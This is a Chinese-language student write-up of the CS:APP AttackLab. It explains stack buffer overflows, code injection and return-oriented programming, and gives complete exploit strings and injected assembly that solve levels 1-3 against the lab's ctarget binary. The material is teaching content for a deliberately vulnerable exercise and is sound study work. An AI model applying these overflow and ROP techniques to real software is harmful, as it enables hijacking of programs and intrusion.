# Lab3 AttackLab
## 实验准备
- 实验介绍：利用可执行程序的漏洞，完成缓冲区溢出攻击。
- 实验环境：Windows11 的 WSL2(Ubuntu 24.04.2 LTS)，实验在 WSL2 的 linux 环境运行。VSCODE 作为代码编辑器，通过 SSH 连接到 WSL2。较新版本的 WSL2 可直接完成实验，无需配置虚拟机或者docker环境。
- 程序运行和调试：使用 lldb + vscode，使用图形化调试方式调试汇编语言。
- 去CSAPP官网下载 WriteUp(实验文档)，Self-Study Handout。然后就可以按照实验文档的指引，开启实验了。
- 实验包含两个可执行程序，`ctarget` `rtarget`。使用`objdump -d ctarget > ctarget.s` `objdump -d rtarget > rtarget.s`可获得可执行程序的汇编代码。
- 实验有5个题目。对每个题目，你需要输入一个单行字符串作为攻击字符串(exploit string)，且使用两个16进制数表示单个byte，比如你输入的攻击字符串可以是`48 b8 35 39 62 39 00 00`。在实验文件夹中创建一个`exploit.txt`文件，然后将攻击字符串写入该文件。
- 执行下列命令。`hex2raw`能够将你编写的人类可读的十六进制（Hex）攻击字符串，转换成程序能够识别的原始二进制（Raw Binary）数据。
```bash
unix> ./hex2raw < exploit.txt > exploit-raw.txt
```
WriteUp中提及，使用以下命令，使得可执行程序能够读取二进制转化后的攻击字符串。
```bash
unix> ./ctarget -i exploit-raw.txt
```
但是在本地执行上述命令会得到报错：`FAILED: Initialization error: Running on an illegal host`。writeup中提及`-q: Don’t send results to the grading server`，所以本地实验需要加上参数q。
- 因此，进行缓冲区溢出攻击的命令是(ctarget | rtarget 的命令格式完全一致)：
```bash
unix> ./ctarget -qi exploit-raw.txt
```
为了实现图形化调试，在实验文件夹创建文件夹`.vscode`，在`.vscode`创建文件`launch.json`，输入下列内容。然后按下vscode“运行和调试”界面的执行按钮，即可图形化运行程序。
```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "type": "lldb",
            "request": "launch",
            "name": "Debug",
            "program": "ctarget", // level4, level5 替换为 rtarget
            "args": ["-q", "-i", "exploit-raw.txt"],
            "initCommands": [
                "breakpoint set --name test",
             ]
        } 
    ]
} 
```
- `breakpoint set --name test`会使得程序停在test函数汇编代码的第一行，修改这条指令的`test`为其它函数名(比如`getbuf`、`touch1`、`touch2`、`touch3`)可以对相应函数进行调试，这在后续实验中检测你的攻击是否符合预期是有益的。
- 程序执行效果。左侧箭头表示调试器停驻点。
```asm
    ; Symbol: test
    ; Source: /usr0/home/droh/ics3/im/labs/attacklab/src/build/visible.c:90
    00401968: 48 83 EC 08                   subq   $0x8, %rsp
--> 0040196C: B8 00 00 00 00                movl   $0x0, %eax
    00401971: E8 32 FE FF FF                callq  0x4017a8  ; getbuf at buf.c:12
    00401976: 89 C2                         movl   %eax, %edx
    00401978: BE 88 31 40 00                movl   $0x403188, %esi  ; imm = 0x403188 
    0040197D: BF 01 00 00 00                movl   $0x1, %edi
    00401982: B8 00 00 00 00                movl   $0x0, %eax
    00401987: E8 64 F4 FF FF                callq  0x400df0  ; symbol stub for: __printf_chk
    0040198C: 48 83 C4 08                   addq   $0x8, %rsp
    00401990: C3                            retq   
```
## 基础知识：Code Injection & Return-oriented programming
**输入缓冲区示例**
- 下列代码展示了一个输入缓冲区：`test()`调用`getbuf()`，我们的输入将存放到`getbuf()`里面的`buf`，其大小为 BUFFER_SIZE，如果我们的输入长度超出了BUFFER_SIZE，就会破坏原有栈结构，实现缓冲区溢出攻击。 
```c
#define BUFFER_SIZE 40

unsigned getbuf() {
    char buf[BUFFER_SIZE]; // attacklab的 BUFFER_SIZE 是 0x28，所以 buffer 大小是 40 个字节
    Gets(buf);
    return 1;
}
void test() {
    int val;
    val = getbuf();
    printf("Noexploit. Getbufreturned0x%x\n",val);
}
```
对应的汇编代码如下，可以概述为：`test()`通过`call`指令调用`getbuf()`。进入`getbuf()`后，在栈上分配40字节空间，读取用户输入，随后释放这40字节空间（仅移动`%rsp`的指向）。最后`getbuf()`返回，继续执行`test()`的下一条指令(即：`0x401976 mov %eax, %edx`)。
```asm
0000000000401968 <test>:
00401968:	48 83 ec 08          	sub    $0x8,%rsp
0040196c:	b8 00 00 00 00       	mov    $0x0,%eax
00401971:	e8 32 fe ff ff       	call   4017a8 <getbuf>
00401976:	89 c2                	mov    %eax,%edx
......

00000000004017a8 <getbuf>:
004017A8: 48 83 EC 28               subq   $0x28, %rsp
004017AC: 48 89 E7                  movq   %rsp, %rdi
004017AF: E8 8C 02 00 00            callq  0x401a40  ; Gets at support.c:163
004017B4: B8 01 00 00 00            movl   $0x1, %eax
004017B9: 48 83 C4 28               addq   $0x28, %rsp
004017BD: C3                        retq   
```
- 下图展示了 **正常情况下** `getbuf()` 返回前后栈结构和有关寄存器的变化，图中地址空间由下向上增长。

![alt text](attacklab-images/正常情况调用test及getbuf.drawio.svg)
### Code Injection(CI)
- 向缓冲区输入超出buffer大小的字节以破坏栈结构。当你在`test()`栈帧的返回地址处（下图左侧`%rsp`指向的地方）写入 buffer 的起始地址，那么在 getbuf 执行 ret 指令后，栈顶元素弹出到`%rip`，程序计数器`%rip`将指向 buffer 的起始地址。如果你在 buffer 里面填写了一些汇编指令的二进制编码，那么程序将执行这些汇编指令。

![alt text](attacklab-images/代码注入攻击.drawio.svg)
### Return-oriented programming(ROP)
1. **为何需要ROP？**
- 第一，栈地址随机初始化，程序每次运行时，系统生成一个随机数`offset`，栈底偏移`offset`个字节，这会导致`getbuf()`中`buf`在栈中的地址每次都是不同的。此时你在`buf`中写攻击代码依然可行，但无法通过覆盖返回地址跳转到`buf`。在Code Injection中，你需要写入诸如`0x5561dc78`这样的`buf`的具体地址以覆盖原来的返回地址，如果这个数值是变化且未知的(即：buf的地址变为`0x5561dc78+random_offset`)，那么你将无法在exploit string中写入覆盖返回地址。
- 第二，栈可以在受保护的模式下运行，即：栈的数据可以读写，但是不能执行。此时你在`buf`中写入的汇编指令将无法执行。
2. **如何进行ROP攻击？**
- ROP攻击讲究化劲，四两拨千斤，主打一个借别人的代码，办自己的事。你需要从既有的程序代码中(这些代码在进程的.text段)摘取代码碎片形成“小组件”(gadget)，gadget是一个指令序列，包含一些汇编指令且以`ret`指令(二进制编码是`c3`)结尾。执行完一个gadget后通过`ret`跳转执行下一个gadget，星星之火，可以燎原：执行多个小碎片，你就可以搞大事了。
- **构建gadget：**
- 下面通过一些汇编代码构建几个 gadget 。
- **gadget1** 直接摘取汇编指令二进制编码：代码`0x4004d4 lea (%rdi,%rdx,1),%rax ret`二进制编码是`48 8d 04 17 c3`，以`c3`结尾且包含完整指令，可作为一个gadget，且该gadget的地址是`0x4004d4`，指向的代码是`lea (%rdi,%rdx,1),%rax ret`
- **gadget2** 摘取汇编指令二进制编码的一部分形成gadget：代码`0x4004d9 movl $0xc78948d4,(%rdi) ret`的二进制编码是`c7 07 d4 48 89 c7 c3`，由于`movq %rax, %rdi`的二进制编码是`48 89 c7`，所以你从`c7 07 d4 [48 89 c7 c3]`摘取中括号的部分即可得到新的gadget：`48 89 c7 c3`。这个gadget的地址是：`0x4004d9 + 3 = 0x4004dc`，指向的代码为`movq %rax, %rdi ret`。
- **gadget3** 摘取汇编指令二进制编码的一部分形成gadget（含有nop指令）：代码`0x4019a7 lea -0x6fa78caf(%rdi),%eax ret`的二进制编码是`8d 87 51 73 58 90 c3`，由于`popq %rax`的二进制编码是`58`，`nop`的二进制编码是`90`。所以从`8d 87 51 73 [58 90 c3]`摘取中括号部分可以得到gadget：`58 90 c3`。这个gadget的地址是：`0x4019a7 + 4 = 0x4019ab`，指向的代码为`popq %rax nop ret`。其中，`nop`的作用是使得程序计数器`%rip`+1，除此之外什么也不做。
- 用这些gadget构建执行链，如下图所示(地址由下到上增长)，蓝色部分为你向`buf`输入的exlploit string。使用gadget1的地址替代`test`栈帧的返回地址，然后向高地址处依次填入其它gadget的地址。其中，pop指令需要的栈顶元素可以在gadget3地址的上方写入。所有gadget执行结束后，弹出`test()`某条指令的地址使得ROP链执行结束后程序继续执行`test()`函数。
![alt text](attacklab-images/构建ROP链.drawio.svg)
- 当`getbuf()`执行`ret`指令后，将激发gadget1汇编指令的执行，gadget1执行ret后，将激发gadget2汇编指令的执行...依次类推。具体的执行过程如下图所示。
![alt text](attacklab-images/ROP链执行拆解.drawio.svg)
## level1
- 在`getbuf`执行结束后跳转到`touch1`，`touch1`没有函数参数。
- 根据`getbuf`的汇编指令`subq $0x28, %rsp`，buffer 的大小是40字节。所以输入攻击字符串时，将40个字节填满，随后8个字节填入`touch1`的地址（touch1函数第一条指令的地址）即可，通过`ctarget.s`，找到`00000000004017c0 <touch1>:`，所以`touch1`的地址是`0x4017c0`，将其充满8字节，并且使用 **小端法** 表示，得到`c0 17 40 00 00 00 00 00`。
- 我们使用40个字符0填满buffer，随后8个字节使用touch1的地址替换`test`栈帧的Return Address，得到本题的答案：
```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00
```
## level2
- 本题需要在`getbuf`执行结束后，给`void touch2(unsigned val)`传递整数(数值需要等于`cookie.txt`里面的值)，然后跳转到`touch2`。
- 由于需要执行汇编指令给`touch2`传参，所以需要在`buffer`里面写传参指令，这里 cookie == 0x59b997fa，将这个数据传入`%rdi`即可。得到的汇编指令是`movq $0x59b997fa, %rdi`。可通过`gcc -c`及`objdump -d`进行汇编和反汇编，得到汇编指令的二进制表示：`48 c7 c7 fa 97 b9 59`。
- 为了能够跳转执行`buffer`中我们自己写入的指令，需要将`test`栈帧的Return Address替换为buffer的起始地址，这里没有使用栈地址随机初始化，所以`buffer`的起始地址是不变的，单步执行getbuf函数的`subq $0x28, %rsp`指令后，打印`%rsp`寄存器的值，得到buffer的起始地址是`0x5561dc78`。所以将`test`栈帧的Return Address这8个字节替换为`78 dc 61 55 00 00 00 00`。
- 在buffer里面，给touch2传参后，还需要能够跳转执行touch2，touch2的地址是`0x4017ec`。我们需要通过`ret`指令进行跳转。而`ret`指令的本质是`popq %rip`。所以需要将函数touch2的地址push到栈里面，然后调用返回指令`ret`。
- 由此，我们需要在buffer及buffer后面8个字节写入的内容是：(其中，汇编语句需要转为二进制指令，返回地址需要小端法表示且占8个字节。指令由下方到上方执行)
```
高地址
+----------------------------+
| 0x5561dc78                 |  <-- 原来test()栈帧的 return address 所在地址
+----------------------------+
| padding (40 bytes total)   |
| .................          |
+----------------------------+
| ret                        |
+----------------------------+
| pushq $0x4017ec            |
+----------------------------+
| movq $0x59b997fa, %rdi     |  <-- buffer 起始地址(0x5561dc78)
+----------------------------+
低地址
```
根据上图，将指令转为二进制表示，padding填充字符0使得buffer里指令语句+padding占满40字节。得到本题答案：
```
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00
```
## level3
- 本题需要在`getbuf`执行结束后，给`void touch3(char *sval)`传递参数，然后跳转到`touch3`。本质上需要在内存中以字符串表示0x59b997fa(cookie)值，并传递该字符串的内存地址。
- 整体思路：在buffer里写入汇编指令，覆盖`test`栈帧的Return Address为buffer的起始地址，使得getbuf()调用`ret`时`%rip`指向buffer，从而执行我们写入的汇编指令。

**1. 覆盖`test`栈帧的Return Address为buffer的起始地址。**

- buffer地址与level2一致，是`0x5561dc78`。

**2. 写出给`touch3`传递参数并跳转到`touch3`的汇编指令，将这些指令写在buffer中。**

- 0x59b997fa写为字符串是"59b997fa"，使用python语句对每个字符查询ascii表的16进制表示，得到二进制序列。
```python
>>> ' '.join([hex(ord(c))[2:] for c in "59b997fa"])
'35 39 62 39 39 37 66 61'
```
- 这是一个8字节数据，在汇编指令中可以用立即数表示，由于立即数用小端法表示，所以立即数应该是`$0x6166373939623935`。
- 由于`touch3`的参数是一个指针，所以这个立即数应该存放到内存中栈空间的某个合适位置。
- 下图列示了当我们覆盖`test`栈帧的返回地址为buffer的起始地址后，getbuf()的ret指令执行前后，栈顶指针`%rsp`和程序计数器`%rip`的变化情况（地址向上增长）。

![alt text](attacklab-images/ret调用前后寄存器指针变化情况.drawio.svg)

- 考虑到后续跳转`touch3`需要`push`touch3的地址到栈空间，所以这个立即数应该存放在上图`getbuf() ret 执行后`栈顶的位置或者更高地址。若执行`push` `ret`指令后，`touch3`地址被弹出，`%rsp`指针(栈顶)在高地址处而立即数在低地址处，那么`touch3`函数执行的时候，可能会覆盖我们在低地址处存放的立即数。
- 比较直观的想法是将立即数放入图中`getbuf() ret 执行后`的`%rsp`指向的位置。基于这种思想，写出下列汇编代码：
```asm
movq $0x6166373939623935, %rax
movq %rax, (%rsp)   # 汇编指令不支持8字节立即数直接写入内存地址，所以需要借助寄存器，这里使用了caller saved register `rax`
movq %rsp, %rdi     # 将写入内存的立即数(也就是字符串"59b997fa")所在地址传递到 %rdi，作为 touch3 的参数值
pushq $0x4018fa     # 将函数 touch3 的地址压栈，以便通过 ret 跳转
ret
```
形成的攻击字符串可以表示为：
```
转化为二进制的汇编代码 + 以字符0补齐到40字节 + 0x5561dc78
-----------------------------------------   ----------
                  buffer                    Return Addr
```
将攻击字符串作为输入运行`ctarget`，得到下列输出：
```
Cookie: 0x59b997fa
Misfire: You called touch3("59b997fa$@")
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:3:48 B8 35 39 62 39 39 37 66 61 48 89 04 24 48 89 E7 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
```
显然，我们输入的字符串出现了问题，因为C语言字符串以'\0'结尾，而我们没有传递'\0'。在程序即将执行我们写的`pushq $0x4018fa`时，使用命令`memory read $rdi`打印`%rdi`指向的内存：
```
0x5561dca8: 35 39 62 39 39 37 66 61 24 1f 40 00 00 00 00 00  59b997fa$.@.....
```
观察内存发现，立即数占前8个字节，但是第9个字节并不是`\0`。所以我们的汇编指令应该在第9个字节写入\0，这可以用`movb`指令。我们由此调整我们的汇编代码：
```asm
movq $0x6166373939623935, %rax
movq %rax, (%rsp)
movb $0, 8(%rsp)   # 新增的代码，在原有字符串后面补上\0 
movq %rsp, %rdi     
pushq $0x4018fa    
ret
```
新的攻击字符串(构建方式与前文一致)：将汇编转为二进制并补\0到40字节 + 0x5561dc78 。得到本题答案：
```
48 B8 35 39 62 39 39 37 66 61 48 89 04 24 C6 44 24 08 00 48 89 E7 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```
- **扩展：**
- 除了在字符串末尾通过movb手动补充\0，还可以将字符串直接写在栈的其它地址，使得写入的8个字节后面本身就是\0。
- 我们打印出 getbuf() 即将执行 ret 指令时栈的状态。
```
高地址
+----------------------------+
| 00 00 00 00 00 00 00 00    |
+----------------------------+
| 24 1f 40 00 00 00 00 00    |  <-- 如果可以把我们cookie字符串的8个字节放到这个位置，高地址就是自然的 00 了。
+----------------------------+
| 09 00 00 00 00 00 00 00    |  <-- 这是我们原来写入 cookie 8个字节的地方，但是它的末尾是 24，不是 00。
+----------------------------+
| 76 19 40 00 00 00 00 00    |  <-- %rsp(栈顶已经被替换为buffer的地址了)
+----------------------------+
低地址
```
根据上述思路，`buffer`的汇编代码还可以写为：
```
movq $0x6166373939623935, %rax
movq %rax, 8(%rsp)
leaq 8(%rsp), %rdi
pushq $0x4018fa
ret
```